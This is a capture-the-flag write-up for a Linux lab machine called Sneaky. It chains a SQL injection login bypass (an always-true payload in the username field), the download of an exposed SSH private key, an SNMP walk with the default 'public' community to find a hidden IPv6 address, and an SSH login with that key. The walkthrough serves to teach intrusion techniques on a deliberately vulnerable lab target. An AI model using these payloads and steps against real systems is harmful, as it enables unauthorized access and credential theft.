## Overview

Sneaky is a medium-difficulty Linux machine. The path to user is a three-step chain: a SQL injection authentication bypass on a `/dev` login page that exposes an SSH private key, an SNMP information leak that reveals the box's hidden IPv6 address (SSH listens only on IPv6), and finally an SSH login over IPv6 with the recovered key. This post covers recon through the user flag.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80/tcp | HTTP (Apache) | web app with a `/dev` login page |
| 161/udp | SNMP | answers the default `public` community |

The web server is the obvious entry point, but the standout detail is that **there is no SSH on the IPv4 address** — a strong hint that the box is hiding a second interface or address.

```bash
nmap -sC -sV 10.129.10.88
sudo nmap -sU --top-ports 50 10.129.10.88   # reveals 161/udp SNMP
```

## Enumeration

Browsing the site leads to a `/dev` page with a login form. The form is the foothold: it builds its SQL query from raw user input, so it's injectable.

On the UDP side, SNMP responds to the default community string `public`. That's the pivot we'll need once we have a key but nowhere to use it.

## Foothold

**1 — SQL injection auth bypass.** Submitting an always-true condition in the username field and commenting out the rest of the query logs us in without a password. The authenticated page then links an SSH private key for user `thrasivoulos`:

```bash
# username field: anything' or 1=1;-- -   password: x
curl -s http://10.129.10.88/dev/sshkeyforadministratordifficulttimes -o id_rsa
chmod 600 id_rsa
```

**2 — Find the hidden IPv6 address via SNMP.** SSH isn't on IPv4, so we ask SNMP for the box's IP address table. The IPv6 entry comes back as raw bytes that decode to the real address:

```bash
snmpwalk -v2c -c public 10.129.10.88 .1.3.6.1.2.1.4.34.1.3
# byte run de:ad:be:ef:..:a0:de:ad:ff:fe:XX:XX:XX  ->  dead:beef::a0de:adff:feXX:XXXX
```

**3 — SSH over IPv6 with the recovered key.** The key is an older RSA key, so a modern SSH client needs the legacy algorithms re-enabled:

```bash
ssh -i id_rsa -o HostkeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa \
  thrasivoulos@dead:beef::a0de:adff:feXX:XXXX
```

## User flag

```bash
cat /home/thrasivoulos/user.txt   # HTB{...}
```

Access as `thrasivoulos` achieved over IPv6 using the SQLi-leaked key.
